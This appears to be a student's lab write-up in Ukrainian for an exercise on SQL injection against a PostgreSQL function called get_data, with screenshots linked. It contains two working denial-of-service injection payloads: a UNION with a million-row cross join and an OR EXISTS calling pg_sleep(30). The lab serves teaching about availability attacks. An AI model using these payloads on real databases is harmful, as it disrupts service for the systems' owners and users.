### Створити виклики функції з SQL-ін'єкціями з порушень доступності, приклади яких представлені в теоретичних відомостях.
### Створити знімки екранів з результатами виконання викликів функції та розмітити їх у файлі access_results.md у GitHub-репозиторії.

`SELECT * FROM get_data('1'' UNION
(SELECT a1, CAST(a1 AS VARCHAR), CAST(a1 AS INTEGER)
FROM (SELECT generate_series a1 FROM generate_series (1,1000)) t1
CROSS JOIN (SELECT * FROM generate_series (1,1000) t2) t3) -- '); `

<img width="882" alt="Снимок экрана 2022-12-23 в 18 21 41" src="https://user-images.githubusercontent.com/46464830/209366988-eb143732-c6cc-4915-8523-7fcc60b7e636.png">

`SELECT * FROM get_data('1'' OR EXISTS (SELECT 1 FROM PG_SLEEP(30)) -- ');`

<img width="567" alt="Снимок экрана 2022-12-23 в 18 23 01" src="https://user-images.githubusercontent.com/46464830/209367159-cc70bc85-c608-405e-a9f3-71ed2875b008.png">
